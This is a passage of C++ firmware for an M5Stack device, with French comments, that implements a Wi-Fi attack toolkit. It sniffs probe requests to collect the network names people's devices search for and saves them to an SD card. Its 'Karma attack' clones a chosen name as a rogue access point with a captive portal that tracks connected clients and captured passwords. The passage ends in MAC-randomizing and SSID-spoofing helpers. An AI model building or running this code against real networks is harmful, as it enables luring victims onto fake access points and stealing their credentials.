          M5.Display.fillRect(0, 15, 50, 10, TFT_BLACK); 
          M5.Display.setCursor(0, 15);
          M5.Display.println("Clients: " + String(newNumClients));
          oldNumClients = newNumClients;
      }

      if (newNumPasswords != oldNumPasswords) {
          M5.Display.fillRect(0, 30, 50, 10, TFT_BLACK); 
          M5.Display.setCursor(0, 30);
          M5.Display.println("Passwords: " + String(newNumPasswords));
          oldNumPasswords = newNumPasswords;
      }

    if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) { // Pression courte
            displayMonitorPage2();
            break;
        } else { // Pression longue
            inMenu = true;
            drawMenu();
            break;
        }
    }

      delay(100);
  }
}

void updateConnectedMACs() {
    wifi_sta_list_t stationList;
    tcpip_adapter_sta_list_t adapterList;
    esp_wifi_ap_get_sta_list(&stationList);
    tcpip_adapter_get_sta_list(&stationList, &adapterList);

    for (int i = 0; i < adapterList.num; i++) {
        char macStr[18];
        snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
                 adapterList.sta[i].mac[0], adapterList.sta[i].mac[1], adapterList.sta[i].mac[2],
                 adapterList.sta[i].mac[3], adapterList.sta[i].mac[4], adapterList.sta[i].mac[5]);
        macAddresses[i] = String(macStr);
    }
}

void displayMonitorPage2() {
    M5.Display.clear();
    M5.Display.setTextSize(0);
    updateConnectedMACs();
    if (macAddresses[0] == "") { 
        M5.Display.setCursor(0, 15);
        M5.Display.println("No client connected");
        Serial.println("----Mac-Address----");
        Serial.println("No client connected");
        Serial.println("-------------------");
    } else {
    Serial.println("----Mac-Address----");
    for (int i = 0; i < 10; i++) {
        int y = 30 + i * 20; 
        if (y > M5.Display.height() - 20) break; 

        M5.Display.setCursor(10, y);
        M5.Display.println(macAddresses[i]);
        Serial.println(macAddresses[i]);
    }
    Serial.println("-------------------");
    }
    

    M5.Display.display();

    while (!inMenu) {
        M5.update();
        handleDnsRequestSerial();
        if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) { // Pression courte
            displayMonitorPage3();
            break;
        } else { // Pression longue
            inMenu = true;
            drawMenu();
            break;
        }
    }
   }
 }

String oldStack = "";
String oldRamUsage = "";
String oldBatteryLevel = "";
String oldTemperature = "";

String getBatteryLevel() {
  
  if (M5.Power.getBatteryLevel() < 0){

    return String("error");
  }else {
  return String(M5.Power.getBatteryLevel());
  }
}

String getTemperature() {
  float temperature;
  M5.Imu.getTemp(&temperature);
  int roundedTemperature = round(temperature); 
  return String(roundedTemperature);
}

String getStack() {
  UBaseType_t stackWordsRemaining = uxTaskGetStackHighWaterMark(NULL);
  return String(stackWordsRemaining * 4 / 1024.0);
}

String getRamUsage() {
  float heapSizeInMegabytes = esp_get_free_heap_size() / 1048576.0; 
  char buffer[10]; 
  sprintf(buffer, "%.2f", heapSizeInMegabytes);
  return String(buffer);
}

unsigned long lastUpdateTime = 0; 
const long updateInterval = 1000; 

void displayMonitorPage3() {
  M5.Display.clear();
  M5.Display.setTextSize(0);
  M5.Display.setTextColor(TFT_WHITE);

 
  oldStack = getStack();
  oldRamUsage = getRamUsage();
  oldBatteryLevel = getBatteryLevel();
  oldTemperature = getTemperature();

  M5.Display.setCursor(10 /4, 15);
  M5.Display.println("Stack left: " + oldStack + " Kb");
  M5.Display.setCursor(10 /4, 30);
  M5.Display.println("RAM: " + oldRamUsage + " Mo");
  M5.Display.setCursor(10 /4, 45);
  M5.Display.println("Batterie: " + oldBatteryLevel + "%");
  M5.Display.setCursor(10 /4, 60);
  M5.Display.println("Temperature: " + oldTemperature + "C");

  M5.Display.display();
  
  lastUpdateTime = millis();

  
  oldStack = "";
  oldRamUsage = "";
  oldBatteryLevel = "";
  oldTemperature = "";

  M5.Display.display();

while (!inMenu) {
    M5.update();
    handleDnsRequestSerial();

    unsigned long currentMillis = millis();

    if (currentMillis - lastUpdateTime >= updateInterval) {
        // Récupérer les nouvelles valeurs
        String newStack = getStack();
        String newRamUsage = getRamUsage();
        String newBatteryLevel = getBatteryLevel();
        String newTemperature = getTemperature();

        // Afficher les valeurs mises à jour
        if (newStack != oldStack) {
            M5.Display.fillRect(10 / 4, 30 / 2, 200 / 4, 20 / 2, TFT_BLACK);
            M5.Display.setCursor(10 / 4, 30 / 2);
            M5.Display.println("Stack left: " + newStack + " Kb");
            oldStack = newStack;
        }

        if (newRamUsage != oldRamUsage) {
            M5.Display.fillRect(10 / 4, 60 / 2, 200 / 4, 20 / 2, TFT_BLACK);
            M5.Display.setCursor(10 / 4, 60 / 2);
            M5.Display.println("RAM: " + newRamUsage + " Mo");
            oldRamUsage = newRamUsage;
        }

        if (newBatteryLevel != oldBatteryLevel) {
            M5.Display.fillRect(10 / 4, 90 / 2, 200 / 4, 20 / 2, TFT_BLACK);
            M5.Display.setCursor(10 / 4, 90 / 2);
            M5.Display.println("Batterie: " + newBatteryLevel + "%");
            oldBatteryLevel = newBatteryLevel;
        }

        if (newTemperature != oldTemperature) {
            M5.Display.fillRect(10 / 4, 120 / 2, 200 / 4, 20 / 2, TFT_BLACK);
            M5.Display.setCursor(10 / 4, 120 / 2);
            M5.Display.println("Temperature: " + newTemperature + "C");
            oldTemperature = newTemperature;
        }

        lastUpdateTime = currentMillis;
    }

    // Gestion du bouton A pour navigation et retour
    if (M5.BtnA.isPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();
    }

    if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;

        if (pressDuration < 1000) { // Pression courte
            displayMonitorPage1();
            break;
        } else { // Pression longue
            inMenu = true;
            drawMenu();
            break;
        }
    }

      delay(100); 
  }
}



void probeSniffing() {
    isProbeSniffingMode = true;
    isProbeSniffingRunning = true; 
    startScanKarma();

    while (isProbeSniffingRunning) { 
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnA.wasPressed()) {
            stopProbeSniffingViaSerial = false;
            isProbeSniffingRunning = false;
            break;
        }
    }

    stopScanKarma(); 
    isProbeSniffingMode = false;
    if (stopProbeSniffingViaSerial) {
        stopProbeSniffingViaSerial = false;
    }
}



void karmaAttack() {
    drawStartButtonKarma();
}

void waitAndReturnToMenu(String message) {
  M5.Display.clear();
  M5.Display.setTextSize(0);
  M5.Display.fillRect(0, M5.Display.height() - 20, M5.Display.width(), 20, TFT_BLACK);
  M5.Display.setCursor(0 , M5.Display.height()/ 2 );
  M5.Display.println(message);
  M5.Display.display();
  delay(1500);
  inMenu = true;
  drawMenu();  
} 


void brightness() {
    int currentBrightness = M5.Display.getBrightness();
    int minBrightness = 1;
    int maxBrightness = 255;

    M5.Display.clear();
    M5.Display.setTextSize(0);
    M5.Display.setTextColor(TFT_WHITE);

    bool brightnessAdjusted = true;
    bool buttonPressed = false;
    unsigned long buttonPressTime = 0;

    while (true) {
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnA.isPressed() && !buttonPressed) {
            buttonPressed = true;
            buttonPressTime = millis();
        }

        if (!M5.BtnA.isPressed() && buttonPressed) {
            unsigned long pressDuration = millis() - buttonPressTime;
            buttonPressed = false;

            if (pressDuration < 1000) { // Appui court
                currentBrightness -= 12;
                if (currentBrightness < minBrightness) {
                    currentBrightness = maxBrightness; // Réinitialiser à 100%
                }
                brightnessAdjusted = true;
            } else { // Appui long
                saveConfigParameter("brightness", currentBrightness);
                break;
            }
        }

        if (brightnessAdjusted) {
            float brightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
            M5.Display.fillScreen(TFT_BLACK);
            M5.Display.setCursor(0,20);
            M5.Display.print("   Brightness: ");
            M5.Display.print((int)brightnessPercentage);
            M5.Display.println("%");
            M5.Display.setBrightness(currentBrightness);
            M5.Display.display();
            brightnessAdjusted = false;
        }
    }

    float finalBrightnessPercentage = 100.0 * (currentBrightness - minBrightness) / (maxBrightness - minBrightness);
    waitAndReturnToMenu("Brightness set to \n\n          " + String((int)finalBrightnessPercentage) + "%");
}

void saveConfigParameter(String key, int value) {
  if (!SD.exists(configFolderPath)) {
    SD.mkdir(configFolderPath);
  }

  String content = "";
  File configFile = SD.open(configFilePath, FILE_READ);
  if (configFile) {
    while (configFile.available()) {
      content += configFile.readStringUntil('\n') + '\n';
    }
    configFile.close();
  } else {
    Serial.println("Error when opening config.txt for reading");
    return;
  }

  int startPos = content.indexOf(key + "=");
  if (startPos != -1) {
    int endPos = content.indexOf('\n', startPos);
    String oldValue = content.substring(startPos, endPos);
    content.replace(oldValue, key + "=" + String(value));
  } else {
    content += key + "=" + String(value) + "\n";
  }

  configFile = SD.open(configFilePath, FILE_WRITE);
  if (configFile) {
    configFile.print(content);
    configFile.close();
    Serial.println(key + " saved!");
  } else {
    Serial.println("Error when opening config.txt for writing");
  }
}



void restoreConfigParameter(String key) {
  if (SD.exists(configFilePath)) {
    File configFile = SD.open(configFilePath, FILE_READ);
    if (configFile) {
      String line;
      int value = defaultBrightness; 
      while (configFile.available()) {
        line = configFile.readStringUntil('\n');
        if (line.startsWith(key + "=")) {
          value = line.substring(line.indexOf('=') + 1).toInt();
          break;
        }
      }
      configFile.close();
      if (key == "brightness") {
        M5.Display.setBrightness(value);
        Serial.println("Brightness restored to " + String(value));
      }
    } else {
      Serial.println("Error when opening config.txt");
    }
  } else {
    Serial.println("Config file not found, using default value");
    if (key == "brightness") {
      M5.Display.setBrightness(defaultBrightness);
    }
  }
}




//KARMA-PART-FUNCTIONS

void packetSnifferKarma(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!isScanningKarma || type != WIFI_PKT_MGMT) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (ssid_count_Karma == 0) {
        M5.Display.setCursor(8, M5.Display.height() / 2 - 10);
        M5.Display.println("Waiting for probe...");
    }

    if (frame_type == 0x40) { // Probe Request Frame
        uint8_t ssid_length_Karma = frame[25];
        if (ssid_length_Karma >= 1 && ssid_length_Karma <= 32) {
            char ssidKarma[33] = {0};
            memcpy(ssidKarma, &frame[26], ssid_length_Karma);
            ssidKarma[ssid_length_Karma] = '\0';
            if (strlen(ssidKarma) == 0 || strspn(ssidKarma, " ") == strlen(ssidKarma)) {
                return;
            }

        bool ssidExistsKarma = false;
        for (int i = 0; i < ssid_count_Karma; i++) {
            if (strcmp(ssidsKarma[i], ssidKarma) == 0) {
                ssidExistsKarma = true;
                break;
            }
        }


        if (isSSIDWhitelisted(ssidKarma)) {
            if (seenWhitelistedSSIDs.find(ssidKarma) == seenWhitelistedSSIDs.end()) {
                seenWhitelistedSSIDs.insert(ssidKarma); 
                Serial.println("SSID in whitelist, ignoring: " + String(ssidKarma));
            }
            return; 
        }

        if (!ssidExistsKarma && ssid_count_Karma < MAX_SSIDS_Karma) {
            strcpy(ssidsKarma[ssid_count_Karma], ssidKarma);
            updateDisplayWithSSIDKarma(ssidKarma, ++ssid_count_Karma);
            Serial.print("Found: ");
            if (ledOn){
                pixels.setPixelColor(0, pixels.Color(255,0,0)); 
                pixels.setPixelColor(9, pixels.Color(255,0,0)); 
                pixels.show(); 
                delay(50); 
            
                pixels.setPixelColor(0, pixels.Color(0,0,0)); 
                pixels.setPixelColor(9, pixels.Color(0,0,0)); 
                pixels.show(); 
                delay(50); 
            }
            Serial.println(ssidKarma);
          }
        }
    }
}

void saveSSIDToFile(const char* ssid) {
    bool ssidExists = false;
    File readfile = SD.open("/probes.txt", FILE_READ);
    if (readfile) {
        while (readfile.available()) {
            String line = readfile.readStringUntil('\n');
            if (line.equals(ssid)) {
                ssidExists = true;
                break;
            }
        }
        readfile.close();
    }
    if (!ssidExists) {
        File file = SD.open("/probes.txt", FILE_APPEND);
        if (file) {
            file.println(ssid);
            file.close();
        } else {
            Serial.println("Error opening probes.txt");
        }
    }
}

  
void updateDisplayWithSSIDKarma(const char* ssidKarma, int count) {
    const int maxLength = 17; 
    char truncatedSSID[18]; 

    M5.Display.fillRect(0, 0, M5.Display.width(), M5.Display.height() - 30, TFT_BLACK);
    int startIndexKarma = max(0, count - maxMenuDisplay);

    for (int i = startIndexKarma; i < count; i++) {
        int lineIndexKarma = i - startIndexKarma;
        M5.Display.setCursor(0, lineIndexKarma * 10);

        if (strlen(ssidsKarma[i]) > maxLength) {
            strncpy(truncatedSSID, ssidsKarma[i], maxLength);
            truncatedSSID[maxLength] = '\0'; 
            M5.Display.printf("%d.%s", i + 1, truncatedSSID);
        } else {
            M5.Display.printf("%d.%s", i + 1, ssidsKarma[i]);
        }
    }
   if ( count <= 9){
    M5.Display.fillRect(M5.Display.width() - 15/2, 0, 15/2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 13/2, 3);
   }else if ( count >= 10 && count <= 99){
    M5.Display.fillRect(M5.Display.width() - 30/2, 0, 30/2, 15, TFT_DARKGREEN);
    M5.Display.setCursor(M5.Display.width() - 27/2, 3);
   }else if ( count >= 100 && count < MAX_SSIDS_Karma*0.7){
    M5.Display.fillRect(M5.Display.width() - 45/2, 0, 45/2, 15, TFT_ORANGE);
     M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(M5.Display.width() - 42/2, 3);
     M5.Display.setTextColor(TFT_WHITE);
   }else{
    M5.Display.fillRect(M5.Display.width() - 45/2, 0, 45/2, 15, TFT_RED);
    M5.Display.setCursor(M5.Display.width() - 42/2, 3);
    }
    if (count == MAX_SSIDS_Karma){
    M5.Display.printf("MAX");
    }else{
    M5.Display.printf("%d", count);
      }
    M5.Display.display();
}


void drawStartButtonKarma() {
  M5.Display.clear();
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_GREEN);
  M5.Display.setCursor(33, M5.Display.height() - 20);
  M5.Display.setTextColor(TFT_BLACK);
  M5.Display.println("Start Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void drawStopButtonKarma() {
  M5.Display.fillRect(0, M5.Display.height() - 30, M5.Display.width(), 30, TFT_RED);
  M5.Display.setCursor(33, M5.Display.height() - 20);
  M5.Display.println("Stop Sniff");
  M5.Display.setTextColor(TFT_WHITE);
}

void startScanKarma() {
  isScanningKarma = true;
  ssid_count_Karma = 0;
  M5.Display.clear();
  drawStopButtonKarma();
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); //petite pause
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&packetSnifferKarma);

  readConfigFile("/config/config.txt");
  seenWhitelistedSSIDs.clear();

  Serial.println("-------------------");
  Serial.println("Probe Sniffing Started...");
  Serial.println("-------------------");
}


void stopScanKarma() {
    Serial.println("-------------------");
    Serial.println("Sniff Stopped. SSIDs found: " + String(ssid_count_Karma));
    Serial.println("-------------------");
    isScanningKarma = false;
    esp_wifi_set_promiscuous(false);


    if (stopProbeSniffingViaSerial && ssid_count_Karma > 0) {
        Serial.println("Saving SSIDs to SD card automatically...");
        for (int i = 0; i < ssid_count_Karma; i++) {
            saveSSIDToFile(ssidsKarma[i]);
        }
        Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
    } else if (isProbeSniffingMode && ssid_count_Karma > 0) {
        delay(1500);
        bool saveSSID = confirmPopup("   Save " + String(ssid_count_Karma) + " SSIDs?");
        if (saveSSID) {
            M5.Display.clear();
            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
            M5.Display.println("Saving SSIDs on SD..");
            for (int i = 0; i < ssid_count_Karma; i++) {
                saveSSIDToFile(ssidsKarma[i]);
            }
            M5.Display.clear();
            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
            M5.Display.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
            Serial.println("-------------------");
            Serial.println(String(ssid_count_Karma) + " SSIDs saved on SD.");
            Serial.println("-------------------");
        } else {
            M5.Display.clear();
            M5.Display.setCursor(0 , M5.Display.height()/ 2 );
            M5.Display.println("  No SSID saved.");
        }
        delay(1000);
    memset(ssidsKarma, 0, sizeof(ssidsKarma));
    ssid_count_Karma = 0;
    }
    

    menuSizeKarma = ssid_count_Karma;
    currentIndexKarma = 0;
    menuStartIndexKarma = 0;
    
    if (isKarmaMode && ssid_count_Karma > 0) {
        drawMenuKarma();
        currentStateKarma = StopScanKarma;
    } else {
        currentStateKarma = StartScanKarma;
        inMenu = true;
        drawMenu();
    }
    isKarmaMode = false;
    isProbeSniffingMode = false;
    stopProbeSniffingViaSerial = false;
}



void handleMenuInputKarma() {
    bool stateChanged = false;
    static unsigned long buttonPressTime = 0;
    static bool buttonPressed = false;

    M5.update();
    
    if (M5.BtnA.wasPressed() && !buttonPressed) {
        buttonPressed = true;
        buttonPressTime = millis();  // Enregistrer le moment où le bouton est appuyé
    } else if (!M5.BtnA.isPressed() && buttonPressed) {
        unsigned long pressDuration = millis() - buttonPressTime;
        buttonPressed = false;  // Réinitialiser l'état du bouton

        if (pressDuration < 1000) {  // Appui court pour naviguer
            currentIndexKarma++;
            if (currentIndexKarma >= menuSizeKarma) {
                currentIndexKarma = 0;
            }
            stateChanged = true;
        } else {  // Appui long pour sélectionner
            executeMenuItemKarma(currentIndexKarma);
            stateChanged = true;
        }
    }

    if (stateChanged) {
        // Ajustement de l'indice de départ pour l'affichage du menu si nécessaire
        menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
        drawMenuKarma();  // Redessiner le menu avec le nouvel indice sélectionné
    }
}



void drawMenuKarma() {
    M5.Display.clear();
    M5.Display.setTextSize(0);
    M5.Display.setTextFont(1);

    int lineHeight = 10;
    int startX = 0;
    int startY = 6;

    for (int i = 0; i < maxMenuDisplayKarma; i++) {
        int menuIndexKarma = menuStartIndexKarma + i;
        if (menuIndexKarma >= menuSizeKarma) break;

        if (menuIndexKarma == currentIndexKarma) {
            M5.Display.fillRect(0, i * lineHeight, M5.Display.width(), lineHeight, TFT_NAVY);
            M5.Display.setTextColor(TFT_GREEN);
        } else {
            M5.Display.setTextColor(TFT_WHITE);
        }
        M5.Display.setCursor(startX, startY + i * lineHeight + (lineHeight / 2) - 11);
        M5.Display.println(ssidsKarma[menuIndexKarma]);
    }
    M5.Display.display();
}

void executeMenuItemKarma(int indexKarma) {
    if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
        startAPWithSSIDKarma(ssidsKarma[indexKarma]);
    } else {
        M5.Display.clear();
        M5.Display.println("Selection invalide!");
        delay(1000);
        drawStartButtonKarma();
        currentStateKarma = StartScanKarma;
    }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/config/config.txt");
  createCaptivePortal();
  
  Serial.println("-------------------");
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println("-------------------");

  M5.Display.clear();
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack (not for Karma Auto)
  
 while (true) {
        M5.update(); 
        handleDnsRequestSerial();
        currentTime = millis();
        remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
        clientCount = WiFi.softAPgetStationNum();
        M5.Lcd.setTextColor(TFT_WHITE, TFT_BLACK); 
        M5.Display.setCursor((M5.Display.width() - 12 * strlen(ssid)) / 2, 25); 
        M5.Display.println(String(ssid));
        
        M5.Display.setCursor(10, 45);
        M5.Display.print("Left Time: ");
        M5.Display.print(remainingTime);
        M5.Display.println(" s");
 
        M5.Display.setCursor(10, 65);
        M5.Display.print("Connected Client: ");
        M5.Display.println(clientCount);

        Serial.println("---Karma-Attack---");
        Serial.println("On :" + String(ssid));
        Serial.println("Left Time: " + String(remainingTime) + "s");
        Serial.println("Connected Client: "+ String(clientCount));
        Serial.println("-------------------");

       M5.Lcd.setTextColor(TFT_WHITE); 
       M5.Display.setCursor(33, 110);
       M5.Display.println(" Stop");
            M5.Display.display();
    
            if (remainingTime <= 0) {
                break;
            }
            if (M5.BtnA.wasPressed()) {
                break;
            }else {
              delay(200);
            }
    
        }
  M5.Display.clear();
  M5.Display.setCursor(15 , M5.Display.height()/ 2 );
  if (clientCount > 0) {
      M5.Display.println("Karma Successful!!!");
      Serial.println("-------------------");
      Serial.println("Karma Attack worked !");
      Serial.println("-------------------");
  }else {
      M5.Display.println(" Karma Failed...");
      Serial.println("-------------------");
      Serial.println("Karma Attack failed...");
      Serial.println("-------------------");
      WiFi.softAPdisconnect(true);
      WiFi.mode(WIFI_STA);
    }
    delay(2000);
  if (confirmPopup("Save " + String(ssid) + " ?" )) {
  saveSSIDToFile(ssid);
  }
  lastIndex = -1;
  inMenu = true;  
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  memset(ssidsKarma, 0, sizeof(ssidsKarma)); 
  ssid_count_Karma = 0;
  drawMenu();  
}


void listProbes() {
    File file = SD.open("/probes.txt", FILE_READ);
    if (!file) {
        Serial.println("Failed to open probes.txt");
        waitAndReturnToMenu("Failed to open probes.txt");
        return;
    }

    String probes[MAX_SSIDS_Karma];
    int numProbes = 0;

    while (file.available() && numProbes < MAX_SSIDS_Karma) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
            probes[numProbes++] = line;
        }
    }
    file.close();

    if (numProbes == 0) {
        Serial.println("No probes found");
        waitAndReturnToMenu("No probes found");
        return;
    }

    const int lineHeight = 18; // Hauteur de ligne pour l'affichage des SSIDs
    const int maxDisplay = (128 - 10) / lineHeight; // Nombre maximum de lignes affichables, en laissant une marge en haut
    int currentListIndex = 0;
    bool needDisplayUpdate = true;
    unsigned long buttonPressTime = 0;
    bool buttonPressed = false;

    while (true) {
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnA.wasPressed() && !buttonPressed) {
            buttonPressed = true;
            buttonPressTime = millis();
        } else if (!M5.BtnA.isPressed() && buttonPressed) {
            unsigned long pressDuration = millis() - buttonPressTime;
            buttonPressed = false;

            if (pressDuration < 1000) { // Appui court pour naviguer
                currentListIndex = (currentListIndex + 1) % numProbes;
                needDisplayUpdate = true;
            } else { // Appui long pour sélectionner
                Serial.println("SSID selected: " + probes[currentListIndex]);
                clonedSSID = probes[currentListIndex];
                waitAndReturnToMenu(probes[currentListIndex] + " selected");
                return; // Sortie de la fonction après sélection
            }
        }

        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(1);
            int y = 10; // Début de l'affichage en y

            for (int i = 0; i < maxDisplay; i++) {
                int probeIndex = (currentListIndex + i) % numProbes;

                if (i == 0) { // Mettre en évidence la sonde actuellement sélectionnée
                    M5.Display.fillRect(0, y, M5.Display.width(), lineHeight, TFT_NAVY);
                    M5.Display.setTextColor(TFT_GREEN);
                } else {
                    M5.Display.setTextColor(TFT_WHITE);
                }

                String ssid = probes[probeIndex];
                M5.Display.setCursor(0, y);
                M5.Display.println(ssid);
                y += lineHeight;
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }
    }
}






bool isProbePresent(String probes[], int numProbes, String probe) {
    for (int i = 0; i < numProbes; i++) {
        if (probes[i] == probe) {
            return true;
        }
    }
    return false;
}



void deleteProbe() {
    File file = SD.open("/probes.txt", FILE_READ);
    if (!file) {
        Serial.println("Failed to open probes.txt");
        waitAndReturnToMenu("Failed to open probes.txt");
        return;
    }

    String probes[MAX_SSIDS_Karma];
    int numProbes = 0;

    while (file.available() && numProbes < MAX_SSIDS_Karma) {
        String line = file.readStringUntil('\n');
        line.trim();
        if (line.length() > 0) {
            probes[numProbes++] = line;
        }
    }
    file.close();

    if (numProbes == 0) {
        waitAndReturnToMenu("No probes found");
        return;
    }

    const int lineHeight = 18;  // Adapté à l'écran de 128x128
    const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
    int currentListIndex = 0;
    int selectedIndex = -1;
    bool needDisplayUpdate = true;
    static bool buttonPressed = false;
    static unsigned long buttonPressTime = 0;

    while (selectedIndex == -1) {
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnA.wasPressed() && !buttonPressed) {
            buttonPressed = true;
            buttonPressTime = millis();
        } else if (!M5.BtnA.isPressed() && buttonPressed) {
            unsigned long pressDuration = millis() - buttonPressTime;
            buttonPressed = false;  // Reset button state

            if (pressDuration < 1000) {  // Short press for navigation
                currentListIndex++;
                if (currentListIndex > numProbes) currentListIndex = 0;
                needDisplayUpdate = true;
            } else {  // Long press for selection
                selectedIndex = currentListIndex;
            }
        }

        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(0);

            for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
                int probeIndex = currentListIndex + i;
                String ssid = probes[probeIndex];
                ssid = ssid.substring(0, min(ssid.length(), (unsigned int)21));  // Tronquer pour l'affichage
                M5.Display.setCursor(0, i * lineHeight + 10);
                M5.Display.setTextColor(probeIndex == currentListIndex ? TFT_GREEN : TFT_WHITE);
                M5.Display.println(ssid);
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }
    }

    // Gestion de la sélection
    if (selectedIndex >= 0 && selectedIndex < numProbes) {
        String selectedProbe = probes[selectedIndex];
        if (confirmPopup("Delete " + selectedProbe + " probe ?")) {
            bool success = removeProbeFromFile("/probes.txt", selectedProbe);
            if (success) {
                Serial.println(selectedProbe + " deleted");
                waitAndReturnToMenu(selectedProbe + " deleted");
            } else {
                waitAndReturnToMenu("Error deleting probe");
            }
        }
    } else {
        waitAndReturnToMenu("No probe selected");
    }
}




int showProbesAndSelect(String probes[], int numProbes) {
    const int lineHeight = 18;  // Adapté à l'écran de 128x128
    const int maxDisplay = (128 - 10) / lineHeight;  // Calcul du nombre maximal de lignes affichables
    int currentListIndex = 0;  // Index de l'élément actuel dans la liste
    int selectedIndex = -1;  // -1 signifie aucune sélection
    bool needDisplayUpdate = true;
    static bool buttonPressed = false;
    static unsigned long buttonPressTime = 0;

    while (selectedIndex == -1) {
        M5.update();
        handleDnsRequestSerial();

        if (M5.BtnA.wasPressed() && !buttonPressed) {
            buttonPressed = true;
            buttonPressTime = millis();
        } else if (!M5.BtnA.isPressed() && buttonPressed) {
            unsigned long pressDuration = millis() - buttonPressTime;
            buttonPressed = false;  // Réinitialiser l'état du bouton

            if (pressDuration < 1000) {  // Appui court pour la navigation
                currentListIndex--;
                if (currentListIndex < 0) currentListIndex = numProbes - 1;
                needDisplayUpdate = true;
            } else {  // Appui long pour la sélection
                selectedIndex = currentListIndex;
            }
        }

        if (needDisplayUpdate) {
            M5.Display.clear();
            M5.Display.setTextSize(0);

            for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
                M5.Display.setCursor(10, i * lineHeight + 10);
                M5.Display.setTextColor(i == 0 ? TFT_GREEN : TFT_WHITE);  // Met en surbrillance l'élément actuel
                M5.Display.println(probes[currentListIndex + i]);
            }

            M5.Display.display();
            needDisplayUpdate = false;
        }
    }

    return selectedIndex;
}

bool removeProbeFromFile(const char* filepath, const String& probeToRemove) {
    File originalFile = SD.open(filepath, FILE_READ);
    if (!originalFile) {
        Serial.println("Failed to open the original file for reading");
        return false;
    }

    const char* tempFilePath = "/temp.txt";
    File tempFile = SD.open(tempFilePath, FILE_WRITE);
    if (!tempFile) {
        Serial.println("Failed to open the temp file for writing");
        originalFile.close();
        return false;
    }

    bool probeRemoved = false;
    while (originalFile.available()) {
        String line = originalFile.readStringUntil('\n');
        if (line.endsWith("\r")) { 
            line = line.substring(0, line.length() - 1);
        }

        if (!probeRemoved && line == probeToRemove) {
            probeRemoved = true;
        } else {
            tempFile.println(line);
        }
    }

    originalFile.close();
    tempFile.close();

    SD.remove(filepath);
    SD.rename(tempFilePath, filepath);

    return probeRemoved;
}

void deleteAllProbes(){
    if (confirmPopup("Delete All Probes ?")) {
        File file = SD.open("/probes.txt", FILE_WRITE);
        if (file) {
            file.close();
            waitAndReturnToMenu("Deleted successfully");
            Serial.println("-------------------");
            Serial.println("Probes deleted successfully");
            Serial.println("-------------------");
        } else {
            waitAndReturnToMenu("Error..");
            Serial.println("-------------------");
            Serial.println("Error opening file for deletion");
            Serial.println("-------------------");
        }
    } else {
        waitAndReturnToMenu("Deletion cancelled");
    }
}

//KARMA-PART-FUNCTIONS-END


//probe attack 


uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
      int index = random(0, sizeof(charset) - 1);
      randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
      mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
    String mac = generateRandomMAC();
    uint8_t macArray[6];
